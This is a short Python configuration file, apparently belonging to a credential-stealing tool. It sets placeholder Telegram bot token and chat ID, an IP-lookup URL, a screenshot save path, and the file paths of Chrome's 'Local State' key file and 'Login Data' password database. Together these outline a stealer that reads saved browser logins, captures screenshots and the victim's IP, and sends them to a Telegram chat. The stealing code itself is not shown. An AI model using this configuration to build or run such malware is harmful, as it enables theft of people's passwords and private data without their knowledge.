from os import environ
from pathlib import Path

TELEGRAM_TOKEN = "your_telegram_token_here"
CHAT_ID = "chat_id_here"
URL_GET_IP = "http://checkip.dyndns.com/"

# TODO: change the directory path of saved screenshots
IMAGE_PATH = 'path_where_you_will_save_the_image'

CHROME_APPDATA_PATH = Path(environ['LOCALAPPDATA']).joinpath('Google\\Chrome\\User Data')
LOCAL_STATE_CHROME = Path(CHROME_APPDATA_PATH).joinpath('Local State')
LOGIN_DB_CHROME = Path(CHROME_APPDATA_PATH).joinpath('Profile 1\\Login Data')